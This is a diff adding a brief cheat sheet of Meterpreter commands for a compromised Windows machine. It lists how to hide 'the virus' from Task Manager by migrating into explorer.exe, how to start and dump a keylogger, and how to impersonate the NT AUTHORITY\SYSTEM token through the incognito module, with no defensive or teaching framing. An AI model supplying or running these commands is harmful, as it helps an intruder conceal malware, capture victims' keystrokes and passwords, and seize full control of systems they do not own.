@@ -1,0 +1,13 @@
+- Hide the virus from task manager:  migrate -N explorer.exe
+
+
+- Start recording keystrokes:        keyscan_start
+			             keyscan_dump
+
+
+- Take SYSTEM permissions:           load incognito
+				     list_tokens -u
+				     impersonate_token "NT AUTHORITY\SYSTEM"
+
+
+- Show all available command lines:  help
